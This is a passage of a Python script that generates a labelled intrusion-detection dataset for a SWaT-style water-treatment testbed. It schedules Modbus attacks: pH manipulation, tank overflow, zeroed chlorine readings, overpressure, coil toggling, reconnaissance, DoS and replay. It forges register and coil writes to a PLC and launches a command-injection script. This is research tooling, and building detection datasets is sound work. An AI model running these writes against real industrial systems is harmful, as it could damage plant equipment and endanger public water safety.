        target_addr = params.get('target_addr', 4)  # pH
        target_value = params.get('value', 300)
        
        self.log(f"  Single register: addr={target_addr}, value={target_value}")
        
        try:
            elapsed = 0
            while elapsed < duration:
                self.mb.write_register(target_addr, target_value)
                time.sleep(1)
                elapsed += 1
            return True
        except Exception as e:
            self.log(f"  Single register failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()
    
    def single_coil(self, duration: int, params: Dict) -> bool:
        """Toggle single coil (pump/valve)."""
        if not self._connect():
            return False
        
        target_coil = params.get('coil_addr', 4)  # P_203
        forced_state = params.get('state', False)
        
        self.log(f"  Single coil: addr={target_coil}, state={forced_state}")
        
        try:
            elapsed = 0
            while elapsed < duration:
                self.mb.write_coil(target_coil, forced_state)
                time.sleep(1)
                elapsed += 1
            return True
        except Exception as e:
            self.log(f"  Single coil failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()
    
    def multi_point(self, duration: int, params: Dict) -> bool:
        """Write multiple registers simultaneously."""
        if not self._connect():
            return False
        
        targets = params.get('targets', [
            {'addr': 4,  'value': 500},    # AIT_202: pH low
            {'addr': 1,  'value': 1000},   # LIT_101: tank high
            {'addr': 12, 'value': 600},    # DPIT_301: TMP high
            {'addr': 51, 'value': 0},      # Chlorine_Residual: force zero (new)
            {'addr': 35, 'value': 250},    # PIT_501: overpressure (new)
        ])
        
        self.log(f"  Multi-point: {len(targets)} targets")
        
        try:
            elapsed = 0
            while elapsed < duration:
                for target in targets:
                    try:
                        self.mb.write_register(target['addr'], target['value'])
                    except:
                        pass
                time.sleep(1)
                elapsed += 1
            return True
        except Exception as e:
            self.log(f"  Multi-point failed: {e}", 'ERROR')
            return False
        finally:
            self._disconnect()


class AttackMetadataFile:
    """File-based attack metadata for cross-process communication."""
    
    def __init__(self, filepath: str = 'attack_metadata.json'):
        self.filepath = Path(filepath)
        self._init_file()
    
    def _init_file(self):
        self.update(0, 'Normal', 'T0')
    
    def update(self, attack_id: int, attack_name: str, mitre_id: str):
        data = {
            'ATTACK_ID': attack_id,
            'ATTACK_NAME': attack_name,
            'MITRE_ID': mitre_id if attack_id > 0 else 'T0',  # Empty string for normal
            'timestamp': datetime.now().isoformat()
        }
        
        with open(self.filepath, 'r+', encoding='utf-8') as f:
            f.seek(0)
            json.dump(data, f)
            f.truncate()     # remove old content
            f.flush()

            import os
            os.fsync(f.fileno())
    
    def read(self) -> Dict:
        try:
            if self.filepath.exists():
                with open(self.filepath, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return {'ATTACK_ID': 0, 'ATTACK_NAME': 'Normal', 'MITRE_ID': 'T0'}


# ═══════════════════════════════════════════════════════════════════════════
# MAIN GENERATOR - FIXED VERSION
# ═══════════════════════════════════════════════════════════════════════════

class ComprehensiveDatasetGenerator:
    """
    FIXED: Proper 5-10 min attacks with network attack repetition.
    
    Configuration:
    - Total: 120 min (60 normal + 60 attack)
    - Attack duration: 5-10 min each
    - Network attacks: 3 instances (DOS, Replay, Recon)
    - Temporal attacks: Random selection to fill time
    """
    
    def __init__(self,
                 plc_host: str,
                 output_dir: str = 'complete_dataset',
                 total_duration_min: int = 120,
                 attack_duration_min: int = 60,
                 plc_port: int = 1502,
                 include_attacks: Optional[List[str]] = None):
        
        self.plc_host = plc_host
        self.plc_port = plc_port
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(exist_ok=True)
        
        self.total_duration = total_duration_min * 60  # 7200s
        self.attack_duration = attack_duration_min * 60  # 3600s
        
        self.master_csv = self.output_dir / 'master_dataset.csv'
        self.timeline_log = self.output_dir / 'attack_timeline.log'
        self.execution_log = self.output_dir / 'execution_details.log'
        self.metadata_file = self.output_dir / 'attack_metadata.json'
        
        self.metadata = AttackMetadataFile(str(self.metadata_file))
        self.logger_proc = None
        self.attack_timeline = []
        self.start_time = None
        self.is_windows = platform.system() == 'Windows'
        
        # Attack types
        base_temporal_attacks = [
            'ph_manipulation',
            'tank_overflow',
            'chemical_depletion',
            'membrane_damage',
            'valve_manipulation',
            'slow_ramp',
        ]
        
        base_network_attacks = ['reconnaissance', 'dos_flood', 'replay']
        
        # Attack metadata
        self.attack_meta = {
            'ph_manipulation':    {'id': 11, 'name': 'pH Manipulation Attack',     'mitre': 'T0836'},
            'tank_overflow':      {'id':  8, 'name': 'Tank Overflow Attack',       'mitre': 'T0836'},
            'chemical_depletion': {'id':  9, 'name': 'Chemical Depletion Attack',  'mitre': 'T0836'},
            'membrane_damage':    {'id': 10, 'name': 'Membrane Damage Attack',     'mitre': 'T0836'},
            'valve_manipulation': {'id': 16, 'name': 'Valve Manipulation Attack',  'mitre': 'T0836'},
            'slow_ramp':          {'id': 12, 'name': 'Slow Ramp Attack',           'mitre': 'T0836'},
            'reconnaissance':     {'id': 13, 'name': 'Reconnaissance Scan',        'mitre': 'T0840'},
            'dos_flood':          {'id': 14, 'name': 'Denial of Service',          'mitre': 'T0814'},
            'replay':             {'id': 15, 'name': 'Replay Attack',              'mitre': 'T0839'},
        }

        for key in list(self.attack_meta.keys()):
            cfg = ATTACK_SCENARIOS.get(key)
            if cfg:
                self.attack_meta[key]['id'] = int(cfg.get('id', self.attack_meta[key]['id']))
                self.attack_meta[key]['name'] = str(cfg.get('name', self.attack_meta[key]['name']))
                self.attack_meta[key]['mitre'] = str(cfg.get('mitre_id', self.attack_meta[key]['mitre']))

        if include_attacks:
            unknown = sorted(set(include_attacks) - set(self.attack_meta))
            if unknown:
                raise ValueError(f"Unknown attacks requested: {', '.join(unknown)}")
            self.temporal_attacks = [a for a in base_temporal_attacks if a in include_attacks]
            self.network_attacks = [a for a in base_network_attacks if a in include_attacks]
        else:
            self.temporal_attacks = base_temporal_attacks
            self.network_attacks = base_network_attacks

        if not self.temporal_attacks and not self.network_attacks:
            raise ValueError("At least one valid attack must be selected")
    
    def log(self, msg: str, level: str = 'INFO'):
        line = f"[{datetime.now():%Y-%m-%d %H:%M:%S}] [{level}] {msg}"
        print(line)
        with open(self.execution_log, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    
    def generate_schedule(self) -> List[Dict]:
        """
        Generate attack schedule:
        - 3× network attacks (DOS, Replay, Recon)
        - Fill remaining with temporal attacks
        - Each attack: 5-10 minutes
        """
        self.log("Generating attack schedule...")
        
        schedule = []
        current_time = 60  # Start after 1 min normal
        total_used = 0
        
        MIN_DURATION_NET = 180  # 5 minutes
        MAX_DURATION_NET = 300  # 10 minutes
        
        # Phase 1: Add 3× network attacks
        for attack_type in self.network_attacks:
            
                if total_used >= self.attack_duration:
                    break
                
                duration = random.randint(MIN_DURATION_NET, MAX_DURATION_NET)
                
                # Don't exceed budget
                remaining = self.attack_duration - total_used
                if duration > remaining:
                    if remaining < MIN_DURATION_NET:
                        break  # Skip if can't do 5 min
                    duration = remaining
                
                meta = self.attack_meta[attack_type]
                params = self._random_params(attack_type)
                
                event = {
                    'start_time': current_time,
                    'duration': duration,
                    'type': attack_type,
                    'name': meta['name'],
                    'mitre_id': meta['mitre'],
                    'id': meta['id'],
                    'params': params,
                }
                
                schedule.append(event)
                total_used += duration
                current_time += duration + random.randint(60, 180)  # Gap
        
        # Phase 2: Fill remaining with temporal attacks.
        # FIX Issue 2: guarantee at least one execution of EVERY temporal attack
        # before random-filling so slow_ramp (and others) are never skipped.
        MIN_DURATION = 300   # 5 minutes
        MAX_DURATION = 600   # 10 minutes

        # First pass: one guaranteed run per temporal attack (shuffled order)
        guaranteed = list(self.temporal_attacks)
        random.shuffle(guaranteed)
        for attack_type in guaranteed:
            remaining = self.attack_duration - total_used
            if remaining < MIN_DURATION:
                break
            duration = random.randint(MIN_DURATION, min(MAX_DURATION, remaining))
            meta   = self.attack_meta[attack_type]
            params = self._random_params(attack_type)
            schedule.append({
                'start_time': current_time,
                'duration':   duration,
                'type':       attack_type,
                'name':       meta['name'],
                'mitre_id':   meta['mitre'],
                'id':         meta['id'],
                'params':     params,
            })
            total_used   += duration
            current_time += duration + random.randint(60, 180)

        # Second pass: random-fill any remaining budget
        while total_used < self.attack_duration:
            remaining = self.attack_duration - total_used
            if remaining < MIN_DURATION:
                break

            attack_type = random.choice(self.temporal_attacks)
            duration = random.randint(MIN_DURATION, MAX_DURATION)

            if duration > remaining:
                duration = remaining

            meta   = self.attack_meta[attack_type]
            params = self._random_params(attack_type)

            event = {
                'start_time': current_time,
                'duration':   duration,
                'type':       attack_type,
                'name':       meta['name'],
                'mitre_id':   meta['mitre'],
                'id':         meta['id'],
                'params':     params,
            }

            schedule.append(event)
            total_used   += duration
            current_time += duration + random.randint(60, 180)
        
        # Sort by start time
        schedule.sort(key=lambda x: x['start_time'])
        
        # Log schedule
        self.log(f"Schedule generated:")
        self.log(f"  Total duration: {self.total_duration}s ({self.total_duration/60:.0f}min)")
        self.log(f"  Total attack time: {total_used}s ({total_used/60:.1f}min)")
        self.log(f"  Number of attacks: {len(schedule)}")
        
        with open(self.timeline_log, 'w') as f:
            f.write("ATTACK SCHEDULE\n")
            f.write("="*70 + "\n")
            for i, event in enumerate(schedule, 1):
                line = f"[{i:2d}] {event['name']:35s} @ {event['start_time']/60:5.1f}min  dur={event['duration']:4d}s\n"
                f.write(line)
                self.log(f"[SCHEDULE] {line.strip()}")
        
        return schedule
    
    def _random_params(self, attack_type: str) -> Dict:
        """Generate random parameters for attack."""
        if attack_type == 'ph_manipulation':

            if random.random() < 0.6:
                return {'target_ph': random.uniform(4.8, 5.5)}   # Acidic — below 6.8 floor
            else:
                return {'target_ph': random.uniform(8.6, 9.0)} 
        elif attack_type == 'tank_overflow':
            return {'overflow_value': random.randint(970, 1100)}
        elif attack_type == 'membrane_damage':
            return {'target_tmp': random.randint(500, 700)}
        elif attack_type == 'slow_ramp':
            if random.random() < 0.5:
                return {
                    'ramp_target': 'AIT_202',
                    'start_value': random.randint(700, 740),
                    'end_value': random.randint(850, 900),
                    'step_size': 1,
                    'step_interval': 2.0,
                }
            else:
                return {
                    'ramp_target': 'AIT_202',
                    'start_value': random.randint(700, 740),
                    'end_value': random.randint(840, 890),
                    'step_size': 1,
                    'step_interval': 2.0,
                }
        elif attack_type == 'chemical_depletion':
            # drain_bisulfate randomly True/False to generate varied depletion patterns
            return {'drain_bisulfate': random.choice([True, False])}
        elif attack_type == 'reconnaissance':
            return {'start_addr': 0, 'end_addr': 100, 'scan_rate': 10}
        elif attack_type == 'dos_flood':
            return {'request_rate': random.randint(500, 1000)}
        elif attack_type == 'replay':
            return {'capture_time': 10}
        else:
            return {}
    
    def start_logging(self):
        # FIX Issue 1: logging is now integrated into physics_client.py.
        # The bridge reads --metadata-file on every cycle and stamps each CSV row.
        # Launching data_logger.py here was the source of 16 Hz double-logging.
        # Nothing to start — the bridge handles it.
        self.log("Logging handled by physics_client.py bridge (integrated logger).")
        self.logger_proc = None
    
    def execute_attack(self, event: Dict):
        """Execute single attack."""
        attack_type = event['type']
        duration = event['duration']
        params = event['params']
        
        self.log(f"▶ ATTACK START: {event['name']} ({duration}s)")
        
        # Update metadata
        self.metadata.update(event['id'], event['name'], event['mitre_id'])
        time.sleep(3)  # Ensure metadata is updated before attack starts
        
        try:
            success = False
            
            # Route to appropriate engine
            if attack_type in self.network_attacks:
                engine = NetworkAttackEngine(self.plc_host, self.plc_port, self.log)
                method = getattr(engine, attack_type)
                success = method(duration, params)
            
            elif attack_type in self.temporal_attacks:
                # Use command_injection.py subprocess
                python_exe = sys.executable
                cmd = [
                    python_exe,
                    'attacks/command_injection.py',
                    '--host', self.plc_host,
                    '--port', str(self.plc_port),
                    '--attack', attack_type,
                    '--duration', str(duration)
                ]
                
                # Add parameters
                if attack_type == 'ph_manipulation':
                    cmd.extend(['--target-ph', str(params['target_ph'])])
                elif attack_type == 'tank_overflow':
                    cmd.extend(['--overflow-value', str(params['overflow_value'])])
                elif attack_type == 'membrane_damage':
                    cmd.extend(['--target-tmp', str(params['target_tmp'])])
                elif attack_type == 'slow_ramp':
                    cmd.extend(['--ramp-target', str(params.get('ramp_target', 'AIT_202'))])
                    cmd.extend(['--start-value', str(params.get('start_value', 720))])
                    cmd.extend(['--end-value', str(params.get('end_value', 860))])
                    cmd.extend(['--step-size', str(params.get('step_size', 1))])
                    cmd.extend(['--step-interval', str(params.get('step_interval', 2.0))])
                elif attack_type == 'chemical_depletion':
                    if not params.get('drain_bisulfate', True):
                        cmd.append('--no-drain-bisulfate')
                
                self.log(f"  Command: {' '.join(cmd)}")
                
                proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                # FIX Issue 3: enforce duration with timeout — attack cannot
                # run longer than its scheduled slot + 10 s grace period.
                try:
                    stdout, stderr = proc.communicate(timeout=duration + 10)
                    success = (proc.returncode == 0)
                except subprocess.TimeoutExpired:
                    self.log(f"  TIMEOUT: {attack_type} exceeded {duration}s — killing process", 'WARNING')
                    proc.kill()
                    stdout, stderr = proc.communicate()
                    success = True  # data was collected for the full duration

                if not success:
                    if stdout:
                        self.log(f"  STDOUT: {stdout.decode(errors='replace').strip()}", 'ERROR')
                    if stderr:
                        self.log(f"  STDERR: {stderr.decode(errors='replace').strip()}", 'ERROR')
            
            if success:
                self.log(f"✓ ATTACK COMPLETE: {event['name']}")
            else:
                self.log(f"✗ ATTACK FAILED: {event['name']}", 'ERROR')
        
        except Exception as e:
            self.log(f"✗ ATTACK ERROR: {event['name']} - {e}", 'ERROR')
            traceback.print_exc()
        
        finally:
            # Always reset to normal
            self.metadata.update(0, 'Normal', 'T0')
    
    def run(self):
        """Main execution."""
        self.start_time = datetime.now()
        
        self.log("="*70)
        self.log("SWAT DATASET GENERATOR - FIXED VERSION")
        self.log("="*70)
        self.log(f"Configuration:")
        self.log(f"  Total: {self.total_duration/60:.0f} min")
        self.log(f"  Attack: {self.attack_duration/60:.0f} min")
        self.log(f"  Each attack: 5-10 min")
        self.log(f"  Network attacks: 3× each (DOS, Replay, Recon)")
        
        try:
            schedule = self.generate_schedule()
            self.start_logging()
            
            elapsed = 0
            attack_index = 0
            
            while elapsed < self.total_duration:
                # Check if attack should start
                if attack_index < len(schedule):
                    next_attack = schedule[attack_index]
                    
                    if elapsed >= next_attack['start_time']:
                        self.execute_attack(next_attack)
                        attack_index += 1
                
                # Progress
                if elapsed % 300 == 0:  # Every 5 min
                    progress = elapsed / self.total_duration * 100
                    self.log(f"Progress: {elapsed/60:.1f}/{self.total_duration/60:.0f}min ({progress:.1f}%)")
                
                time.sleep(1)
                elapsed += 1
            
            self.log("✓ Generation complete")
        
        except KeyboardInterrupt:
            self.log("Interrupted by user", 'WARNING')
        except Exception as e:
            self.log(f"Error: {e}", 'ERROR')
            traceback.print_exc()
        finally:
            self.cleanup()
    
    def cleanup(self):
        """Stop logger and finalize."""
        self.log("Cleanup...")
        
        if self.logger_proc and self.logger_proc.poll() is None:
            self.log("Stopping logger...")
            self.logger_proc.terminate()
            try:
                self.logger_proc.wait(timeout=10)
            except:
                self.logger_proc.kill()
        
        self.metadata.update(0, 'Normal', 'T0')
        
        self.log("="*70)
        self.log("COMPLETE")
        self.log("="*70)
        self.log(f"Output: {self.master_csv}")
        self.log(f"Rows: {sum(1 for _ in open(self.master_csv)) if self.master_csv.exists() else 0}")


def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='SWAT Dataset Generator (Fixed)')
    parser.add_argument('--host', required=True, help='PLC IP address')
    parser.add_argument('--port', type=int, default=1502, help='Modbus port')
    parser.add_argument('--total', type=int, help='Total duration (minutes)')
    parser.add_argument('--attack', type=int, help='Attack duration (minutes)')
    parser.add_argument('--output', default='complete_dataset', help='Output directory')
    parser.add_argument(
        '--include-attacks',
        default='',
        help='Comma-separated subset of attacks to schedule '
             '(e.g. reconnaissance,dos_flood,replay,ph_manipulation)'
    )
    
    args = parser.parse_args()
    
    generator = ComprehensiveDatasetGenerator(
        plc_host=args.host,
        output_dir=args.output,
        total_duration_min=args.total,
        attack_duration_min=args.attack,
        plc_port=args.port,
        include_attacks=[a.strip() for a in args.include_attacks.split(',') if a.strip()] or None
    )
    
    generator.run()


if __name__ == '__main__':
    main()